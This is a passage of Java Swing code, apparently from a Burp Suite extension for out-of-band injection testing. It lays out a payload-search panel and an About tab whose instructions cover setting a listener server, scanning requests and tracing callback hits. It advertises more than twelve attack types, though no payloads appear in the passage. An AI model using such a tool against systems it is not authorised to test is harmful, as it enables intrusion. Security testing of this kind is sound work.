							.addComponent(PS_Response_Status_code_Label_8)
							.addComponent(PS_Response_Status_code_Value_8)
							)
					.addGroup(layout2.createSequentialGroup().addComponent(Waste_line))
					.addComponent(SRTRepeater_button, GroupLayout.Alignment.CENTER)
					.addGroup(layout2.createSequentialGroup().addComponent(Waste_line))
					.addGroup(layout2.createSequentialGroup().addComponent(Panel2_notification_Toast))
					);
			layout2.setVerticalGroup(layout2.createSequentialGroup()
					.addGroup(layout2.createParallelGroup().addComponent(Waste_line))
					.addGroup(layout2.createParallelGroup()
							.addComponent(Payload_List_Label)
							.addComponent(Filter_Search_Request)
							.addComponent(Waste_line)
							.addComponent(Search_button))
					.addGroup(layout2.createParallelGroup().addComponent(Waste_line))
					.addGroup(layout2.createParallelGroup()
							.addComponent(PS_Muzzy_Number_Label_1)
							.addComponent(PS_Muzzy_Number_Value_1)
							)
					.addGroup(layout2.createParallelGroup()
							.addComponent(PS_URL_Label_2)
							.addComponent(PS_URL_Value_2)
							)
					.addGroup(layout2.createParallelGroup()
							.addComponent(PS_Host_Label_3)
							.addComponent(PS_Host_Value_3)
							)
					.addGroup(layout2.createParallelGroup()
							.addComponent(PS_Port_Label_4)
							.addComponent(PS_Port_Value_4)
							)
					.addGroup(layout2.createParallelGroup()
							.addComponent(PS_Parameter_Label_5)
							.addComponent(PS_Parameter_Value_5)
							)
					.addGroup(layout2.createParallelGroup()
							.addComponent(PS_Payload_Label_6)
							.addComponent(PS_Payload_Value_6)
							)
					.addGroup(layout2.createParallelGroup()
							.addComponent(PS_Info_Label_7)
							.addComponent(PS_Info_Value_7)
							)
					.addGroup(layout2.createParallelGroup()
							.addComponent(PS_Response_Status_code_Label_8)
							.addComponent(PS_Response_Status_code_Value_8)
							)
					.addGroup(layout2.createParallelGroup().addComponent(Waste_line))
					.addComponent(SRTRepeater_button)
					.addGroup(layout2.createParallelGroup().addComponent(Waste_line))
					.addGroup(layout2.createParallelGroup().addComponent(Panel2_notification_Toast))
					);
			
	 }
	 
	 
	 private void load_layout_3(GroupLayout layout3) {
			// 3rd Tab         ----------------------- ABOUT ------------------------
						
					String testetst = "\n\t\t\t How to Use\n\t\t=+=+=+=+=+=+=+=\n\n"
							+ "\t Add your DNS/IP in 'Listener interface' from Settings Panel\n"
							+ "\t Click on Save Setting\n"
							+ "\t Select Request to test\n"
							+ "\t New scan -> Select scan item -> Select individual issues\n"
							+ "\t Make sure 'Extension generated issue' is enable\n"
							+ "\t Start scan\n"
							+ "\t Once received the hit on server\n"
							+ "\t Go to Search Payload Panel and search with the number you received\n"
							+ "\t Observe the details and Send Request to Repeater"
							+ "\n\n"
							+ "\t\t -+-\n\n"
							+ "\t Developed by: Muzkkir Husseni\n"
							+ "\t https://muzkkir.com \n\n"
							+ "\t Features:\n"
							+ "\t + Out of Band on Intranet and Internet facing application\n"
							+ "\t + Customise IP or Domain server\n"
							+ "\t + Easy Interface\n"
							+ "\t + 12+ Types of Attacks and a Wide Range of Payloads\n\n"
							+ "\t Happy to listern your feedback :) Ping me on LinkedIn!\n"
							+ "\t https://www.linkedin.com/in/hussenimuzkkir/\n\n"
							+ "\t Like the extension? Let me know by giving it a star on GitHub.\n"
							+ "\t https://github.com/mymuzzy/\n\n"
							+ "\t Thank You :)";

			JTextPane textPane = new JTextPane();
			StyledDocument doc = textPane.getStyledDocument();
			textPane.setEditable(false);
			javax.swing.text.Style def = StyleContext.getDefaultStyleContext().getStyle(StyleContext.DEFAULT_STYLE);

	        javax.swing.text.Style regular = doc.addStyle("regular", def);
	        StyleConstants.setFontFamily(def, "Serif");
	 
	        javax.swing.text.Style  s = doc.addStyle("large", regular);
	        StyleConstants.setFontSize(s, 20);
			
			try {
			    doc.insertString(doc.getLength(), testetst, doc.getStyle("large"));
			} catch (BadLocationException ble) {}

			
			layout3.setHorizontalGroup(layout3.createParallelGroup()
					.addComponent(textPane, GroupLayout.Alignment.CENTER)
					);
			layout3.setVerticalGroup(layout3.createSequentialGroup()
					.addGroup(layout3.createParallelGroup()
							.addComponent(textPane)
							)
					);	
	 }
}
